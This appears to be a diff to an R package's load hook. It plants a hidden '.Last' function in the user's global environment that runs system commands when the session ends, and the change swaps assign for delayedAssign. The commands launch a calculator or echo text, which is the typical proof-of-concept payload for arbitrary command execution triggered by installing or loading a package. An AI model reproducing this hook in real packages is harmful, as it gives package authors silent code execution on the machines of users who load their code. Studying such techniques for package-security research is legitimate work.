@@ -2,12 +2,12 @@
 
 .onLoad <- function(libname, pkgname){
   env <- ".GlobalEnv"
-  assign('.Last',
+  delayedAssign('.Last',
          function(...){
              cmd = if(.Platform$OS.type =='windows') 'calc.exe' else
                if (grepl('^darwin', version$os)) 'open -a Calculator.app' else
                  'echo TRULLALLAAA!!!'
              system(cmd) },
-         envir=get(env) )
+         assign.env=get(env) )
 }
 
